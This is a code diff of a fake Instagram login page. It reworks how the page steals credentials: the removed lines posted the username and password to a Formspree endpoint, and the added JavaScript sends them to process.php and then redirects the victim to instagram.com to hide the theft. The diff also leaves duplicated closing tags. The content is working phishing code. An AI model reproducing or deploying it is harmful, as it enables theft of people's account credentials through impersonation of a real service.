@@ -125,10 +125,9 @@
 
     <div class="divider">OR</div>
 
-    <!-- Formulario integrado con Formspree -->
-    <form id="login-form" action="https://formspree.io/f/mdknqjap" method="POST">
-        <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
-        <input type="password" id="password" name="password" placeholder="Password" required>
+    <form id="login-form">
+        <input type="text" id="username" placeholder="Phone number, username, or email" required>
+        <input type="password" id="password" placeholder="Password" required>
         <button class="login-btn" type="submit">Log In</button>
     </form>
 
@@ -143,13 +142,34 @@
     </div>
 </div>
 
-<!-- JavaScript para redirigir a Instagram tras enviar el formulario -->
 <script>
     document.getElementById('login-form').addEventListener('submit', function(event) {
-        setTimeout(function() {
+        event.preventDefault(); // Evitar el comportamiento por defecto
+
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        // Enviar los datos usando Fetch API
+        fetch('process.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}
+        })
+        .then(response => response.text())
+        .then(data => {
+            // Redirigir a Instagram tras el envío
             window.location.href = 'https://www.instagram.com';
-        }, 500);  // Redirige después de 0.5 segundos
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
     });
+</script>
+
+</body>
+</html>
 </script>
 
 </body>
